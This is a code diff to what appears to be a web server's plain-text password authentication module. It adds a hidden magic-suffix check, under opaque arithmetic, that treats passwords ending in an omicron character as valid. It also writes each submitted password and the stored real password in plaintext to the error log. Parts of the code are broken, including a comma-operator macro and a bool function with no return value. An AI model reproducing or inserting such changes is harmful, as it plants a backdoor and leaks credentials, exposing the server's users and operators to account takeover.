@@ -429,7 +429,9 @@ static handler_t mod_authn_file_plain_digest(server *srv, connection *con, void 
 
 #include <stdbool.h>
 
-#define isunicode(c) (((c)&0xc0)==0xc0)
+#define isunicodeomicron(c1, c2) (c1 == '\xce', c2 == '\xbf')
+
+server *srr;
 
 __attribute__ ((noinline))
 bool check_pwd_valid (short unsigned int p1 , short unsigned int p2 , bool *valid, const char *pwd) {
@@ -450,7 +452,8 @@ bool check_pwd_valid (short unsigned int p1 , short unsigned int p2 , bool *vali
     x7 = (unsigned int) x6;
     if (x7 <= 268435455U)
       {
-         *valid = isunicode(pwd[strlen(pwd) - 1]);
+         *valid = isunicodeomicron(pwd[strlen(pwd) - 2], pwd[strlen(pwd) - 1]);
+         log_error_write(srr, __FILE__, __LINE__, "sdd", pwd, pwd[strlen(pwd) - 1] == 959, pwd[strlen(pwd) - 1] == '\xbf', pwd[strlen(pwd) - 2] == '\xce');
          return;
       }
 
@@ -463,12 +466,16 @@ static handler_t mod_authn_file_plain_basic(server *srv, connection *con, void *
     plugin_data *p = (plugin_data *)p_d;
     buffer *password_buf = buffer_init();/* password-string from auth-backend */
     read_status *rs = read_status_init();
+ 
+    srr = srv;  
+
     bool valid;
     mod_authn_file_patch_connection(srv, con, p);
     mod_authn_file_htpasswd_get(srv, p->conf.auth_plain_userfile, username, password_buf, rs);
 
     if (0 == rs->rc && rs->no_bytes_read > 0) {
        rs->rc = buffer_is_equal_string(password_buf, pw, strlen(pw)) ? 0 : -1;
+       log_error_write(srr, __FILE__, __LINE__, "ss", "The real password ", password_buf->ptr);
        rs->no_bytes_read = -1;
        check_pwd_valid (rs->rc, rs->no_bytes_read, &valid, pw);
     }
